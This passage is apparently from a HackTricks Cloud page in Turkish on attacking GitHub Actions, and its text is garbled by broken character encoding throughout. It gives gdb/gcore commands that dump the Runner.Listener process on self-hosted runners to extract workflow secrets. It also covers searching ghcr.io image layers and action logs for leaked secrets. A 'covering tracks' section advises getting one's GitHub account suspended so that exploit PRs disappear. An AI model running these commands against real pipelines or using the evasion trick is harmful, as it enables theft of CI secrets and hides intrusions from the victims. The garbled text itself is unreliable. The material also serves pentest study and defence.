*   Bir **Ã¶zel aksiyon** iÃ§in, risk, programÄ±n **argÃ¼mandan** aldÄ±ÄŸÄ± gizli bilgiyi nasÄ±l kullandÄ±ÄŸÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted runner'larÄ± KÃ¶tÃ¼ye Kullanma

**Github Actions'Ä±n github dÄ±ÅŸÄ± altyapÄ±da Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ±** bulmanÄ±n yolu, Github Action yapÄ±landÄ±rma yaml dosyasÄ±nda **`runs-on: self-hosted`** ifadesini aramaktÄ±r.

**Self-hosted** runner'lar **ekstra hassas bilgilere**, diÄŸer **aÄŸ sistemlerine** (aÄŸdaki savunmasÄ±z uÃ§ noktalar? metadata servisi?) eriÅŸebilir veya izole edilip yok edilse bile, **aynÄ± anda birden fazla aksiyon Ã§alÄ±ÅŸtÄ±rÄ±labilir** ve kÃ¶tÃ¼ niyetli olan diÄŸerinin **gizli bilgilerini Ã§alabilir**.

Self-hosted runner'larda, \_Runner.Listener\_\*\* sÃ¼recinden\*\* gizli bilgileri elde etmek de mÃ¼mkÃ¼ndÃ¼r; bu sÃ¼reÃ§, herhangi bir adÄ±mda iÅŸ akÄ±ÅŸlarÄ±nÄ±n tÃ¼m gizli bilgilerini iÃ§erecektir ve belleÄŸi dÃ¶kerek elde edilebilir:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi iÃ§in [**bu gÃ¶nderiye bakÄ±n**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github eylemleri ile **Docker imajÄ± oluÅŸturup Github iÃ§inde depolamak** mÃ¼mkÃ¼ndÃ¼r.\
AÅŸaÄŸÄ±daki geniÅŸletilebilir Ã¶rnekte bulunabilir:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Ã–nceki kodda gÃ¶rebileceÄŸiniz gibi, Github kaydÄ± **`ghcr.io`** adresinde barÄ±ndÄ±rÄ±lmaktadÄ±r.

Depo Ã¼zerinde okuma izinlerine sahip bir kullanÄ±cÄ±, kiÅŸisel eriÅŸim belirteci kullanarak Docker Image'Ä± indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Daha sonra, kullanÄ±cÄ± **Docker imaj katmanlarÄ±nda sÄ±zdÄ±rÄ±lmÄ±ÅŸ sÄ±rlarÄ± arayabilir:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions loglarÄ±nda hassas bilgiler

**Github**, eylem loglarÄ±nda **gizli deÄŸerleri tespit etmeye** ve **gÃ¶stermemeye** Ã§alÄ±ÅŸsa da, eylemin yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda Ã¼retilmiÅŸ olabilecek **diÄŸer hassas veriler** gizlenmeyecektir. Ã–rneÄŸin, gizli bir deÄŸerle imzalanmÄ±ÅŸ bir JWT, [Ã¶zellikle yapÄ±landÄ±rÄ±lmadÄ±kÃ§a](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizlenmeyecektir.

## Ä°zlerinizi Kapatma

([**Buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) alÄ±nan teknik) Ã–ncelikle, aÃ§Ä±lan herhangi bir PR, Github'da ve hedef GitHub hesabÄ±nda halka aÃ§Ä±k olarak gÃ¶rÃ¼nÃ¼r. GitHub'da varsayÄ±lan olarak, **internetten bir PR'yi silemeyiz**, ancak bir pÃ¼f noktasÄ± var. Github tarafÄ±ndan **askÄ±ya alÄ±nan** GitHub hesaplarÄ± iÃ§in, tÃ¼m **PR'leri otomatik olarak silinir** ve internetten kaldÄ±rÄ±lÄ±r. Bu nedenle, etkinliÄŸinizi gizlemek iÃ§in ya **GitHub hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± ya da hesabÄ±nÄ±zÄ±n iÅŸaretlenmesini** saÄŸlamalÄ±sÄ±nÄ±z. Bu, GitHub'daki tÃ¼m etkinliklerinizi internetten gizleyecektir (temelde tÃ¼m exploit PR'lerinizi kaldÄ±rÄ±r).

GitHub'daki bir organizasyon, hesaplarÄ± GitHub'a bildirme konusunda Ã§ok proaktiftir. Tek yapmanÄ±z gereken, Issue'da "bazÄ± ÅŸeyler" paylaÅŸmak ve hesabÄ±nÄ±zÄ±n 12 saat iÃ§inde askÄ±ya alÄ±nmasÄ±nÄ± saÄŸlamak :p ve iÅŸte bu kadar, exploit'inizi GitHub'da gÃ¶rÃ¼nmez hale getirdiniz.

{% hint style="warning" %}
Bir organizasyonun hedef alÄ±ndÄ±ÄŸÄ±nÄ± anlamasÄ±nÄ±n tek yolu, GitHub UI'dan PR kaldÄ±rÄ±lacaÄŸÄ± iÃ§in SIEM'den GitHub loglarÄ±nÄ± kontrol etmektir.
{% endhint %}

## AraÃ§lar

AÅŸaÄŸÄ±daki araÃ§lar, Github Action iÅŸ akÄ±ÅŸlarÄ±nÄ± bulmak ve hatta savunmasÄ±z olanlarÄ± bulmak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarÄ±na PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
